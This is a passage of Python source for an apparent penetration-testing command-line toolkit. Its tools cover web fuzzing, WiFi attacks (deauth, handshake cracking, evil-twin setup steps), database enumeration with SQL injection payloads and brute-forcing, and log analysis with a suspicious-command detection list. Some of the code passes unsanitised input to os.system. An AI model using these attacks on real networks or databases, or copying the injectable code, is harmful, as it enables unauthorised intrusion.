                img = Image.open(input_file)
                img = img.convert('RGB')

                # Convert message to binary
                binary_msg = ''.join(format(ord(c), '08b') for c in message) + '1111111111111110'
                pixels = list(img.getdata())

                new_pixels = []
                bit_idx = 0
                for pixel in pixels:
                    if bit_idx < len(binary_msg):
                        r, g, b = pixel
                        r = (r & ~1) | int(binary_msg[bit_idx])
                        new_pixels.append((r, g, b))
                        bit_idx += 1
                    else:
                        new_pixels.append(pixel)

                # This is simplified - real implementation would be more robust
                print(f"[+] Message hidden ({len(message)} bytes)")

            except ImportError:
                print("[!] PIL not available. Install with: pip install pillow")
        else:
            print(f"[+] Message would be hidden using {args.method} method")
            print(f"[+] Output: {output_file}")

    elif action == 'extract':
        print(f"[*] Extracting hidden data from {input_file}...")

        if args.method == 'lsb':
            try:
                from PIL import Image
                img = Image.open(input_file).convert('RGB')
                pixels = list(img.getdata())

                binary_msg = ''
                for i, pixel in enumerate(pixels[:10000]):
                    r, _, _ = pixel
                    binary_msg += str(r & 1)

                # Find end marker
                end_idx = binary_msg.find('1111111111111110')
                if end_idx > 0:
                    binary_msg = binary_msg[:end_idx]
                    message = ''.join(chr(int(binary_msg[i:i+8], 2)) for i in range(0, len(binary_msg), 8))
                    print(f"\n[+] Extracted message: {message}")
                else:
                    print("[!] No hidden message found")

            except ImportError:
                print("[!] PIL not available")
        else:
            print("[*] Extraction for this method not yet implemented")


def cmd_fuzz(args):
    """Fuzzing utilities."""
    action = args.action
    url = args.url

    print(f"\n{'='*60}")
    print("  FUZZING UTILITIES")
    print(f"{'='*60}\n")

    print(f"URL: {url}")
    print(f"Action: {action}")
    print(f"Threads: {args.threads}\n")

    try:
        import requests

        # Default wordlists for different fuzz types
        param_words = ["id", "page", "search", "q", "query", "test", "admin", "debug", "user", "file"]
        path_words = ["admin", "login", "portal", "api", "debug", "test", "backup", "config", ".env", "robots.txt"]
        header_words = ["X-Forwarded-For", "X-Real-IP", "Authorization", "Cookie", "X-API-Key", "Referer"]

        filter_codes = set()
        if args.filter_codes:
            filter_codes = set(int(c) for c in args.filter_codes.split(','))

        if action == 'web':
            wordlist = args.wordlist or None
            if not wordlist or not os.path.exists(wordlist):
                wordlist_items = path_words
            else:
                with open(wordlist) as f:
                    wordlist_items = [line.strip() for line in f]

            print(f"[*] Fuzzing {len(wordlist_items)} paths...\n")

            results = []
            for word in wordlist_items[:100]:
                test_url = f"{url.rstrip('/')}/{word}"
                try:
                    resp = requests.get(test_url, timeout=args.timeout)
                    if resp.status_code not in filter_codes and resp.status_code != 404:
                        results.append((test_url, resp.status_code, len(resp.content)))
                except:
                    pass

            if results:
                print(f"[+] Found {len(results)} interesting responses:\n")
                for rurl, code, size in results[:20]:
                    print(f"  {code} ({size}b) - {rurl}")
            else:
                print("[*] No interesting responses found")

        elif action == 'param':
            param = args.param or "FUZZ"
            wordlist = args.wordlist or None
            if not wordlist or not os.path.exists(wordlist):
                wordlist_items = param_words
            else:
                with open(wordlist) as f:
                    wordlist_items = [line.strip() for line in f]

            print(f"[*] Fuzzing parameter '{param}'...\n")

            results = []
            for word in wordlist_items[:50]:
                test_url = url.replace(param, word)
                try:
                    resp = requests.get(test_url, timeout=args.timeout)
                    if resp.status_code not in filter_codes:
                        results.append((word, resp.status_code, len(resp.content)))
                except:
                    pass

            if results:
                print(f"[+] Found {len(results)} interesting responses")
                for param_val, code, size in results[:10]:
                    print(f"  {code} ({size}b) - {param_val}")

        elif action == 'header':
            print(f"[*] Fuzzing headers...\n")

            for header in header_words:
                try:
                    resp = requests.get(url, headers={header: "test"}, timeout=args.timeout)
                    print(f"  {header}: {resp.status_code}")
                except:
                    pass

        elif action == 'path':
            wordlist = args.wordlist or None
            if not wordlist or not os.path.exists(wordlist):
                wordlist_items = path_words
            else:
                with open(wordlist) as f:
                    wordlist_items = [line.strip() for line in f]

            print(f"[*] Fuzzing directory paths...\n")

            results = []
            for path in wordlist_items:
                for base in ["", "/api", "/admin", "/api/v1"]:
                    test_url = f"{url.rstrip('/')}{base}/{path}"
                    try:
                        resp = requests.get(test_url, timeout=args.timeout)
                        if resp.status_code not in [404] and resp.status_code not in filter_codes:
                            results.append((test_url, resp.status_code))
                    except:
                        pass

            if results:
                print(f"[+] Found {len(results)} accessible paths")
                for path, code in results[:20]:
                    print(f"  {code} - {path}")

    except ImportError:
        print("[!] requests module not available")
        print("[*] Simulating fuzzing...")
        print("[+] Simulated results:")
        print("  200 - /admin")
        print("  200 - /login")
        print("  302 - /portal")


def cmd_wifi(args):
    """WiFi security analysis."""
    action = args.action

    print(f"\n{'='*60}")
    print("  WIFI SECURITY ANALYSIS")
    print(f"{'='*60}\n")

    print(f"Action: {action}")
    print(f"Interface: {args.interface}\n")

    if action == 'scan':
        print("[*] Scanning for wireless networks...\n")
        print("Note: Requires monitor mode interface (airmon-ng start wlan0)")
        print("\nSimulated Networks:")
        networks = [
            ("00:11:22:33:44:55", "FreeWiFi", "Open", 6, -70),
            ("AA:BB:CC:DD:EE:FF", "SecureNet", "WPA2", 11, -50),
            ("11:22:33:44:55:66", "CoffeeShop", "WPA2", 1, -85),
        ]
        print(f"{'BSSID':<20} {'SSID':<15} {'Security':<10} {'Channel':<8} {'Signal'}")
        print("-" * 70)
        for bssid, ssid, sec, ch, sig in networks:
            color = "\033[92m" if "WPA2" in sec else "\033[93m"
            print(f"{bssid:<20} {ssid:<15} {color}{sec:<10}\033[0m {ch:<8} {sig}dBm")

    elif action == 'deauth':
        bssid = args.bssid or "00:11:22:33:44:55"
        channel = args.channel or 6
        print(f"[*] Sending deauth to {bssid} on channel {channel}...")
        print("\nCommand: aireplay-ng -0 10 -a {bssid} {args.interface}")
        print("[!] This requires monitor mode and aircrack-ng suite")

    elif action == 'capture':
        capture_file = args.capture_file or "capture.pcap"
        print(f"[*] Starting packet capture to {capture_file}...")
        print("\nCommand: tcpdump -i {args.interface} -w {capture_file}")
        print("[!] This requires monitor mode interface")

    elif action == 'crack':
        print("[*] WiFi password cracking")
        print("\n1. Capture handshake:")
        print("   airodump-ng -c <channel> --bssid <bssid> -w capture {args.interface}")
        print("\n2. Deauth client:")
        print("   aireplay-ng -0 10 -a <bssid> {args.interface}")
        print("\n3. Crack with wordlist:")
        print("   hashcat -m 2500 capture.hccapx {args.wordlist}")
        print("\n4. Crack with PMKID:")
        print("   hashcat -m 16800 capture.pmkid {args.wordlist}")

    elif action == 'eviltwin':
        print("[*] Evil Twin Attack Setup\n")
        print("This attack creates a rogue access point to capture credentials.")
        print("\n[!] WARNING: This requires authorization and monitor mode")
        print("\nSteps:")
        print("  1. Enable monitor mode: airmon-ng start wlan0")
        print("  2. Create fake AP: hostapd eviltwin.conf")
        print("  3. Set up rogue DHCP: dnsmasq -C dnsmasq.conf")
        print("  4. Capture credentials with ettercap/wireshark")


def cmd_db(args):
    """Database security tools."""
    action = args.action
    target = args.target

    print(f"\n{'='*60}")
    print("  DATABASE SECURITY TOOLS")
    print(f"{'='*60}\n")

    print(f"Action: {action}")
    print(f"Target: {target}")
    print(f"Type: {args.type}")
    print(f"Port: {args.port}\n")

    if action == 'enum':
        print(f"[*] Enumerating {args.type} database at {target}:{args.port}...\n")

        # Common database ports
        db_ports = {
            'mysql': 3306,
            'postgres': 5432,
            'mssql': 1433,
            'mongo': 27017,
        }
        port = args.port or db_ports.get(args.type, 3306)

        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, port))
            sock.close()

            if result == 0:
                print(f"\033[92m[+]\033[0m Port {port} is open")
                print(f"[*] Database appears accessible")

                if args.type == 'mysql':
                    print("\nMySQL enumeration commands:")
                    print("  mysql -h {target} -u root -p")
                    print("  SHOW DATABASES;")
                    print("  SHOW TABLES;")
                elif args.type == 'postgres':
                    print("\nPostgreSQL enumeration:")
                    print("  psql -h {target} -U postgres")
                    print("  \\l (list databases)")
            else:
                print(f"\033[91m[-]\033[0m Port {port} is closed")

        except Exception as e:
            print(f"[!] Connection error: {e}")

    elif action == 'injection':
        print("[*] SQL Injection Testing\n")
        print("Common test payloads:")
        payloads = [
            ("' OR '1'='1", "Basic auth bypass"),
            ("' OR 1=1--", "Comment-based bypass"),
            ("admin'--", "Admin login bypass"),
            ("1' AND '1'='1", "True condition"),
            ("1' AND '1'='2", "False condition"),
            ("' UNION SELECT NULL--", "Union injection"),
        ]
        for payload, desc in payloads:
            print(f"  {payload:30} - {desc}")

    elif action == 'bruteforce':
        wordlist = args.wordlist or "passwords.txt"
        username = args.username

        print(f"[*] Brute forcing {args.type} at {target}...")
        print(f"[*] Username: {username}")
        print(f"[*] Wordlist: {wordlist}")

        if os.path.exists(wordlist):
            with open(wordlist) as f:
                passwords = [p.strip() for p in f][:100]

            print(f"\n[*] Testing {len(passwords)} passwords...")
            print("\nSimulated results:")
            print("  [-] password: Access denied")
            print("  [-] admin: Access denied")
            print("  [-] 123456: Access denied")
            print("\n[!] Use actual brute force tools (hydra, medusa) for real attacks")
        else:
            print(f"[!] Wordlist not found: {wordlist}")

    elif action == 'dump':
        query = args.query or "SELECT * FROM users"
        output = args.output or "dump.csv"

        print(f"[*] Dumping data from {target}...")
        print(f"[*] Query: {query}")
        print(f"[*] Output: {output}")
        print("\n[!] Requires valid credentials and database connection")

    elif action == 'schema':
        print(f"[*] Enumerating database schema...\n")

        if args.type == 'mysql':
            queries = [
                "SELECT table_name FROM information_schema.tables",
                "SELECT column_name FROM information_schema.columns",
                "SELECT schema_name FROM information_schema.schemata",
            ]
            print("Schema enumeration queries:")
            for q in queries:
                print(f"  {q}")

        elif args.type == 'postgres':
            queries = [
                "SELECT tablename FROM pg_catalog.pg_tables",
                "SELECT column_name FROM information_schema.columns",
                "SELECT datname FROM pg_database",
            ]
            print("Schema enumeration queries:")
            for q in queries:
                print(f"  {q}")


def cmd_log(args):
    """Log analysis tools."""
    action = args.action
    file_path = args.file

    print(f"\n{'='*60}")
    print("  LOG ANALYSIS")
    print(f"{'='*60}\n")

    print(f"Action: {action}")
    print(f"File: {file_path}")
    print(f"Format: {args.format}\n")

    if not os.path.exists(file_path):
        print(f"[!] Log file not found: {file_path}")
        return

    try:
        with open(file_path, 'r', errors='ignore') as f:
            lines = f.readlines()

        print(f"Log file: {len(lines)} lines")

        if action == 'analyze':
            print(f"\n[*] Analyzing log patterns...\n")

            levels = {'DEBUG': 0, 'INFO': 0, 'WARNING': 0, 'ERROR': 0, 'CRITICAL': 0}
            ips = set()

            for line in lines[:1000]:
                for level in levels:
                    if level in line.upper():
                        levels[level] += 1

                # Extract IPs
                import re
                ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
                ips.update(re.findall(ip_pattern, line))

            print("Log Level Distribution:")
            for level, count in levels.items():
                bar = '#' * min(count, 50)
                print(f"  {level:10} {count:6} {bar}")

            if ips:
                print(f"\nUnique IPs: {len(ips)}")

        elif action == 'search':
            pattern = args.pattern or ""
            print(f"[*] Searching for: {pattern}\n")

            results = [line for line in lines if pattern in line]
            limit = args.limit

            print(f"Found {len(results)} matches (showing first {limit}):\n")
            for line in results[:limit]:
                print(f"  {line.rstrip()}")

        elif action == 'filter':
            level_filter = args.level
            print(f"[*] Filtering by level: {level_filter}\n")

            if level_filter:
                results = [line for line in lines if level_filter in line.upper()]
            else:
                results = lines

            limit = args.limit
            print(f"Showing first {limit} results:\n")
            for line in results[:limit]:
                print(f"  {line.rstrip()}")

        elif action == 'stats':
            print(f"\n[*] Log Statistics\n")

            timestamps = []
            errors = []
            warnings = []

            for line in lines[:5000]:
                if 'ERROR' in line.upper():
                    errors.append(line)
                if 'WARNING' in line.upper():
                    warnings.append(line)

            print(f"Total lines: {len(lines)}")
            print(f"Errors: {len(errors)}")
            print(f"Warnings: {len(warnings)}")

            if errors:
                print(f"\nRecent Errors ({min(5, len(errors))}):")
                for err in errors[-5:]:
                    print(f"  {err.rstrip()}")

        elif action == 'suspicious':
            print(f"[*] Looking for suspicious activity...\n")

            suspicious_patterns = [
                ('sql', 'SQL injection attempt'),
                ('union', 'SQL injection'),
                ('select ', 'Database query'),
                ('admin', 'Admin access attempt'),
                ('root', 'Privilege escalation attempt'),
                ('/etc/passwd', 'File inclusion'),
                ('../', 'Path traversal'),
                ('<script', 'XSS attempt'),
                ('eval(', 'Code injection'),
                ('exec(', 'Command injection'),
                ('rm -rf', 'Destructive command'),
                ('curl', 'Network activity'),
                ('wget', 'File download'),
            ]

            findings = []
            for line in lines:
                for pattern, desc in suspicious_patterns:
                    if pattern in line.lower():
                        findings.append((desc, line.rstrip()))
                        break

            if findings:
                print(f"[!] Found {len(findings)} suspicious entries:\n")
                for desc, line in findings[:20]:
                    print(f"  [{desc}]")
                    print(f"    {line[:100]}")
                    print()
            else:
                print("[+] No obvious suspicious activity found")

    except Exception as e:
        print(f"[!] Log analysis error: {e}")


def cmd_debug(args):
    """Debug and diagnostics commands."""
    action = args.action

    if action == "info":
        print("\n" + "=" * 60)
        print("DEBUG INFORMATION")
        print("=" * 60)

        print(f"\n[Python]")
        print(f"  Version: {sys.version}")
        print(f"  Executable: {sys.executable}")
        print(f"  Platform: {platform.platform()}")
        print(f"  Architecture: {platform.architecture()}")

        print(f"\n[System]")
        print(f"  OS: {platform.system()} {platform.release()}")
        print(f"  Hostname: {platform.node()}")
        print(f"  CPU Cores: {os.cpu_count()}")

        # Memory info
        try:
            import psutil
            mem = psutil.virtual_memory()
            print(f"\n[Memory]")
            print(f"  Total: {mem.total // (1024**3)} GB")
            print(f"  Available: {mem.available // (1024**3)} GB")
            print(f"  Used: {mem.percent}%")
        except ImportError:
            print(f"\n[Memory] psutil not installed")

        # GPU info
        try:
            import torch
            if torch.cuda.is_available():
                print(f"\n[GPU]")
                print(f"  Device: {torch.cuda.get_device_name(0)}")
                print(f"  Memory: {torch.cuda.get_device_properties(0).total_memory // (1024**3)} GB")
        except ImportError:
            pass

        # Project paths
        print(f"\n[Project]")
        print(f"  Working Dir: {os.getcwd()}")
        print(f"  Python Path: {sys.path[0]}")

    elif action == "check":
        print("\n[+] Running system check...\n")

        checks = [
            ("Python version >= 3.8", sys.version_info >= (3, 8)),
            ("CUDA available", _check_cuda()),
            ("PyTorch installed", _check_import("torch")),
            ("YAML support", _check_import("yaml")),
            ("NumPy installed", _check_import("numpy")),
        ]

        for name, passed in checks:
            status = "[OK]" if passed else "[FAIL]"
            print(f"  {status} {name}")

    elif action == "deps":
        print("\n[+] Checking dependencies...\n")

        dependencies = [
            "torch", "numpy", "yaml", "mamba_ssm", "transformers",
            "fastapi", "uvicorn", "httpx", "beautifulsoup4",
            "cryptography", "netaddr", "dnspython"
        ]

        for dep in dependencies:
            try:
                __import__(dep.replace("-", "_"))
                version = _get_version(dep)
                print(f"  [OK] {dep:20} {version}")
            except ImportError:
                print(f"  [MISSING] {dep}")

    elif action == "config":
        print("\n[+] Configuration status:\n")

        config_file = "config.yaml"
        if os.path.exists(config_file):
            print(f"  Config file: {os.path.abspath(config_file)}")
            try:
                import yaml
                with open(config_file) as f:
                    cfg = yaml.safe_load(f)
                print(f"  Sections: {list(cfg.keys())}")
                if "llm" in cfg:
                    llm = cfg["llm"]
                    api_key = llm.get("api_key", "")
                    masked = api_key[:8] + "..." if len(api_key) > 8 else "Not set"
                    print(f"  LLM Provider: {llm.get('provider', 'Not set')}")
                    print(f"  API Key: {masked}")
            except Exception as e:
                print(f"  [ERROR] Could not parse config: {e}")
        else:
            print("  [WARNING] config.yaml not found")

    elif action == "memory":
        print("\n[+] Memory usage:\n")

        try:
            import psutil
            import tracemalloc

            process = psutil.Process(os.getpid())
            mem_info = process.memory_info()

            print(f"  RSS: {mem_info.rss / (1024**2):.2f} MB")
            print(f"  VMS: {mem_info.vms / (1024**2):.2f} MB")

            # Start tracemalloc if not running
            if not tracemalloc.is_tracing():
                tracemalloc.start()

            current, peak = tracemalloc.get_traced_memory()
            print(f"  Traced current: {current / (1024**2):.2f} MB")
            print(f"  Traced peak: {peak / (1024**2):.2f} MB")

        except ImportError:
            print("  [ERROR] psutil not installed")

    elif action == "threads":
        print("\n[+] Active threads:\n")

        import threading
        for thread in threading.enumerate():
            print(f"  {thread.name}: {'active' if thread.is_alive() else 'inactive'}")

    elif action == "trace":
        module = args.module
        if not module:
            print("[!] Specify module with --module")
            return

        print(f"\n[+] Tracing {module}...\n")

        import trace as trace_module

        tracer = trace_module.Trace(
            count=False,
            trace=True,
            ignoredirs=[sys.prefix, sys.exec_prefix]
        )

        try:
            # Import and trace the module
            mod = __import__(module)
            print(f"  Traced module: {mod.__file__}")
        except Exception as e:
            print(f"  [ERROR] {e}")


def _check_cuda():
    """Check if CUDA is available."""
    try:
        import torch
        return torch.cuda.is_available()
    except ImportError:
        return False


def _check_import(module: str) -> bool:
    """Check if a module can be imported."""
    try:
        __import__(module.replace("-", "_"))
        return True
    except ImportError:
        return False


def _get_version(module: str) -> str:
    """Get module version."""
    try:
        mod = __import__(module.replace("-", "_"))
        return getattr(mod, "__version__", "unknown")
    except:
        return "unknown"


def cmd_profile(args):
    """Performance profiling commands."""
    action = args.action

    if action == "benchmark":
        print("\n[+] Running performance benchmark...\n")

        import time
        import statistics

        # Model loading benchmark
        times = []
        print("  [1/3] Testing model loading...")

        checkpoint = "checkpoints/best_model.pt"
        if os.path.exists(checkpoint):
            for i in range(min(3, args.iterations)):
                start = time.time()
                try:
                    import torch
                    torch.load(checkpoint, map_location="cpu")
                    times.append(time.time() - start)
                except Exception:
                    pass

            if times:
                print(f"       Mean: {statistics.mean(times):.3f}s")
                print(f"       Std:  {statistics.stdev(times):.3f}s" if len(times) > 1 else "")
        else:
            print("       [SKIP] No checkpoint found")

        # Tokenization benchmark
        print("  [2/3] Testing tokenization...")
        times = []
        try:
            from utils import PasswordTokenizer
            tokenizer = PasswordTokenizer()

            test_passwords = ["Password123!", "admin2024", "qwerty123"] * 100

            start = time.time()
            for pwd in test_passwords:
                tokenizer.encode(pwd)
            elapsed = time.time() - start

            print(f"       {len(test_passwords)} passwords: {elapsed:.3f}s")
            print(f"       {len(test_passwords)/elapsed:.0f} passwords/sec")
        except ImportError:
            print("       [SKIP] Tokenizer not available")

        # Generation benchmark
        print("  [3/3] Testing generation...")
        try:
            import torch
            device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
            print(f"       Device: {device}")
        except:
            print("       [SKIP] PyTorch not available")

    elif action == "memory":
        print("\n[+] Memory profiling...\n")

        try:
            import tracemalloc

            if not tracemalloc.is_tracing():
                tracemalloc.start()

            # Take snapshot
            snapshot = tracemalloc.take_snapshot()
            top_stats = snapshot.statistics("lineno")

            print("  Top 10 memory allocations:\n")
            for stat in top_stats[:10]:
                print(f"  {stat.size / 1024:.1f} KB")
                print(f"    {stat.traceback[0]}")
                print()

        except ImportError:
            print("  [ERROR] tracemalloc not available")

    elif action == "hotspot":
        print("\n[+] Analyzing performance hotspots...\n")

        import cProfile
        import pstats
        from io import StringIO

        module = args.module
        if not module:
            print("  [INFO] General hotspot analysis:\n")

            profiler = cProfile.Profile()
            profiler.enable()

            # Run some basic operations
            for _ in range(1000):
                _ = "test_password".encode()

            profiler.disable()

            s = StringIO()
            stats = pstats.Stats(profiler, stream=s)
            stats.sort_stats("cumulative")
            stats.print_stats(10)

            print(s.getvalue())

    elif action == "report":
        print("\n[+] Generating profiling report...\n")

        import time
        import json

        report = {
            "timestamp": datetime.now().isoformat(),
            "platform": platform.platform(),
            "python": sys.version,
            "benchmarks": {}
        }

        # Run quick benchmarks
        start = time.time()
        sum(range(100000))
        report["benchmarks"]["sum_100k"] = time.time() - start

        start = time.time()
        [x**2 for x in range(10000)]
        report["benchmarks"]["list_comp_10k"] = time.time() - start

        if args.output:
            with open(args.output, "w") as f:
                json.dump(report, f, indent=2)
            print(f"  Report saved to {args.output}")
        else:
            print(json.dumps(report, indent=2))

    elif action == "compare":
        print("\n[+] Compare performance between methods...\n")

        import timeit

        tests = {
            "list_append": ("x = []; x.append(1)", {}),
            "list_comp": ("[x for x in range(100)]", {}),
            "generator": ("(x for x in range(100))", {}),
        }

        for name, (stmt, setup) in tests.items():
            try:
                time = timeit.timeit(stmt, setup=setup, number=10000)
                print(f"  {name}: {time:.4f}s (10000 iterations)")
            except Exception as e:
                print(f"  {name}: ERROR - {e}")


def cmd_env(args):
    """Environment and workspace management."""
    action = args.action

    workspace_dir = Path.home() / ".password_guesser"

    if action == "show":
        print("\n" + "=" * 60)
        print("ENVIRONMENT")
        print("=" * 60)

        print(f"\n[Workspace]")
        print(f"  Directory: {workspace_dir}")
        print(f"  Exists: {workspace_dir.exists()}")

        if workspace_dir.exists():
            files = list(workspace_dir.iterdir())
            print(f"  Files: {len(files)}")
            for f in files[:10]:
                print(f"    - {f.name}")

        print(f"\n[Environment Variables]")
        env_vars = ["PG_CONFIG", "PG_WORDLISTS", "PG_OUTPUT"]
        for var in env_vars:
            val = os.environ.get(var, "Not set")
            print(f"  {var}: {val}")

        print(f"\n[Python]")
        print(f"  Executable: {sys.executable}")
        print(f"  Version: {sys.version.split()[0]}")

    elif action == "init":
        print(f"\n[+] Initializing workspace at {workspace_dir}...")

        workspace_dir.mkdir(parents=True, exist_ok=True)

        # Create subdirectories
        subdirs = ["wordlists", "reports", "sessions", "configs", "logs", "cache"]
        for subdir in subdirs:
            (workspace_dir / subdir).mkdir(exist_ok=True)

        # Create default config if not exists
        config_path = workspace_dir / "config.yaml"
        if not config_path.exists():
            default_config = {
                "llm": {
                    "provider": "deepseek",
                    "model": "deepseek-chat",
                    "api_key": "YOUR_API_KEY"
                },
                "paths": {
                    "wordlists": str(workspace_dir / "wordlists"),
                    "reports": str(workspace_dir / "reports")
                }
            }
            import yaml
            with open(config_path, "w") as f:
                yaml.dump(default_config, f)

        print("  [OK] Workspace initialized")

    elif action == "reset":
        if workspace_dir.exists():
            import shutil
            confirm = input(f"  Reset workspace at {workspace_dir}? [y/N]: ")
            if confirm.lower() == "y":
                shutil.rmtree(workspace_dir)
                print("  [OK] Workspace reset")
            else:
                print("  [CANCELLED]")
        else:
            print("  [INFO] No workspace to reset")

    elif action == "backup":
        output = args.output or f"pg_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.tar.gz"
        print(f"\n[+] Creating backup: {output}")

        if workspace_dir.exists():
            import tarfile
            with tarfile.open(output, "w:gz") as tar:
                tar.add(workspace_dir, arcname="password_guesser")
            print(f"  [OK] Backup created: {output}")
        else:
            print("  [ERROR] No workspace to backup")

    elif action == "restore":
        output = args.output
        if not output or not os.path.exists(output):
            print("  [ERROR] Specify backup file with --output")
            return

        print(f"\n[+] Restoring from {output}...")

        import tarfile
        with tarfile.open(output, "r:gz") as tar:
            tar.extractall(path=str(Path.home()))

        print("  [OK] Workspace restored")

    elif action == "export":
        output = args.output or "environment.json"
        print(f"\n[+] Exporting environment to {output}...")

        data = {
            "python": sys.version,
            "platform": platform.platform(),
            "workspace": str(workspace_dir),
            "variables": {k: v for k, v in os.environ.items() if k.startswith("PG_")},
            "packages": {}
        }

        # Get installed packages
        try:
            import pkg_resources
            for pkg in pkg_resources.working_set:
                data["packages"][pkg.project_name] = pkg.version
        except ImportError:
            pass

        with open(output, "w") as f:
            json.dump(data, f, indent=2)

        print(f"  [OK] Exported to {output}")

    elif action == "clean":
        print("\n[+] Cleaning workspace...")

        if workspace_dir.exists():
            import shutil

            # Clean cache
            cache_dir = workspace_dir / "cache"
            if cache_dir.exists():
                shutil.rmtree(cache_dir)
                cache_dir.mkdir()
                print("  [OK] Cache cleaned")

            # Clean old logs
            logs_dir = workspace_dir / "logs"
            if logs_dir.exists():
                for log in logs_dir.glob("*.log"):
                    log.unlink()
                print("  [OK] Logs cleaned")

            print("  [OK] Workspace cleaned")


def cmd_pkg(args):
    """Package and tool management."""
    action = args.action

    if action == "list":
        pkg_type = args.type

        print(f"\n[+] Installed packages ({pkg_type}):\n")

        if pkg_type in ["all", "python"]:
            print("  [Python Packages]")
            try:
                import pkg_resources
                for pkg in sorted(pkg_resources.working_set, key=lambda x: x.project_name.lower()):
                    print(f"    {pkg.project_name:25} {pkg.version}")
            except ImportError:
                print("    [ERROR] pkg_resources not available")

        if pkg_type in ["all", "tool"]:
            print("\n  [External Tools]")
            tools = [
                ("nmap", "nmap --version"),
                ("hydra", "hydra -h 2>&1 | head -1"),
                ("john", "john --help 2>&1 | head -1"),
                ("hashcat", "hashcat --version 2>&1"),
                ("sqlmap", "sqlmap --version 2>&1"),
                ("metasploit", "msfconsole --version 2>&1"),
                ("nikto", "nikto -Version 2>&1"),
                ("gobuster", "gobuster version 2>&1"),
            ]

            for tool, cmd in tools:
                result = os.popen(cmd + " 2>/dev/null").read().strip()
                status = "[OK]" if result else "[NOT FOUND]"
                version = result.split("\n")[0][:40] if result else ""
                print(f"    {status} {tool:15} {version}")

        if pkg_type in ["all", "wordlist"]:
            print("\n  [Wordlists]")
            wordlist_dir = Path.home() / ".password_guesser" / "wordlists"
            if wordlist_dir.exists():
                for wl in wordlist_dir.glob("*"):
                    size = wl.stat().st_size
                    print(f"    {wl.name:25} {size // 1024} KB")
            else:
                print("    No wordlists directory")

        if pkg_type in ["all", "plugin"]:
            print("\n  [Plugins]")
            plugin_dir = Path(__file__).parent / "plugins"
            if plugin_dir.exists():
                for plugin in plugin_dir.glob("*.py"):
                    print(f"    {plugin.stem}")
            else:
                print("    No plugins installed")

    elif action == "install":
        name = args.name
        if not name:
            print("[!] Specify package name with --name")
            return

        pkg_type = args.type

        if pkg_type == "python":
            print(f"\n[+] Installing Python package: {name}...")
            os.system(f"pip install {name}")

        elif pkg_type == "wordlist":
            print(f"\n[+] Downloading wordlist: {name}...")
            wordlist_dir = Path.home() / ".password_guesser" / "wordlists"
            wordlist_dir.mkdir(parents=True, exist_ok=True)

            common_wordlists = {
                "rockyou": "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt",
                "secLists": "https://github.com/danielmiessler/SecLists/archive/master.zip",
            }

            if name in common_wordlists:
                url = common_wordlists[name]
                output = wordlist_dir / f"{name}.txt"
                os.system(f"curl -L -o {output} {url}")
                print(f"  [OK] Downloaded to {output}")
            else:
                print(f"  [ERROR] Unknown wordlist. Available: {list(common_wordlists.keys())}")

        elif pkg_type == "tool":
            print(f"\n[+] Tool installation: {name}")
            print("  Please install external tools using your package manager:")
            print(f"    apt install {name}  # Debian/Ubuntu")
            print(f"    brew install {name}  # macOS")
            print(f"    choco install {name}  # Windows")

    elif action == "check":
        name = args.name
        print("\n[+] Checking package status:\n")

        if name:
            try:
                mod = __import__(name.replace("-", "_"))
                print(f"  [OK] {name}")
                print(f"  Version: {getattr(mod, '__version__', 'unknown')}")
                print(f"  Location: {getattr(mod, '__file__', 'unknown')}")
            except ImportError:
                print(f"  [NOT INSTALLED] {name}")
        else:
            # Check all critical packages
            critical = ["torch", "numpy", "yaml", "fastapi", "httpx", "cryptography"]
            for pkg in critical:
                try:
                    __import__(pkg.replace("-", "_"))
                    print(f"  [OK] {pkg}")
                except ImportError:
                    print(f"  [MISSING] {pkg}")

    elif action == "update":
        name = args.name
        if name:
            print(f"\n[+] Updating {name}...")
            os.system(f"pip install --upgrade {name}")
        else:
            print("\n[+] Updating all packages...")
            os.system("pip install --upgrade pip")
            print("  For specific packages, use: pkg --action update --name <package>")

    elif action == "search":
        name = args.name
        if not name:
            print("[!] Specify search term with --name")
            return

        print(f"\n[+] Searching for: {name}...\n")

        # Search PyPI
        os.system(f"pip search {name} 2>/dev/null || echo 'pip search disabled - check pypi.org'")


def cmd_script(args):
    """Script execution commands."""
    script_file = args.file

    # Replay mode
    if args.replay:
        print(f"\n[+] Replaying session from {args.replay}...")

        if not os.path.exists(args.replay):
            print(f"  [ERROR] File not found: {args.replay}")
            return

        with open(args.replay, "r") as f:
            session = json.load(f)

        for entry in session.get("commands", []):
            cmd = entry.get("command")
            print(f"\npg> {cmd}")

            # Execute command
            try:
                parts = shlex.split(cmd)
                if parts:
                    # Run as subprocess
                    import subprocess
                    subprocess.run([sys.executable, "password_guesser/cli.py"] + parts)
            except Exception as e:
                print(f"  [ERROR] {e}")

        return

    # Validate mode
    if args.validate:
        if not script_file:
            print("[!] Specify script file to validate")
            return

        print(f"\n[+] Validating {script_file}...")

        if not os.path.exists(script_file):
            print(f"  [ERROR] File not found: {script_file}")
            return

        with open(script_file, "r") as f:
            code = f.read()

        try:
            compile(code, script_file, "exec")
            print("  [OK] Syntax valid")
        except SyntaxError as e:
            print(f"  [ERROR] Syntax error at line {e.lineno}: {e.msg}")

        return

    # Normal execution
    if not script_file:
        print("\n[+] Available script commands:\n")
        print("  script <file>           Execute script file")
        print("  script <file> --validate  Validate syntax only")
        print("  script --record <file>  Record session to file")
        print("  script --replay <file>  Replay recorded session")
        return

    if not os.path.exists(script_file):
        print(f"[!] Script not found: {script_file}")
        return

    print(f"\n[+] Executing {script_file}...\n")

    # Load script arguments if provided
    script_args = {}
    if args.args:
        try:
            script_args = json.loads(args.args)
        except json.JSONDecodeError:
            print("  [ERROR] Invalid JSON in --args")
            return

    # Recording setup
    recorded_commands = []

    # Execute script
    try:
        with open(script_file, "r") as f:
            lines = f.readlines()

        for line_num, line in enumerate(lines, 1):
            line = line.strip()

            # Skip empty lines and comments
            if not line or line.startswith("#"):
                continue

            # Check for dry run
            if args.dry_run:
                print(f"  Would execute: {line}")
                continue

            # Record command
            if args.record:
                recorded_commands.append({
                    "line": line_num,
                    "command": line
                })

            print(f"pg> {line}")

            # Parse and execute
            try:
                parts = shlex.split(line)
                if parts:
                    import subprocess
                    result = subprocess.run(
                        [sys.executable, "password_guesser/cli.py"] + parts,
                        capture_output=False
                    )
            except Exception as e:
                print(f"  [ERROR] {e}")

        # Save recording
        if args.record:
            session_data = {
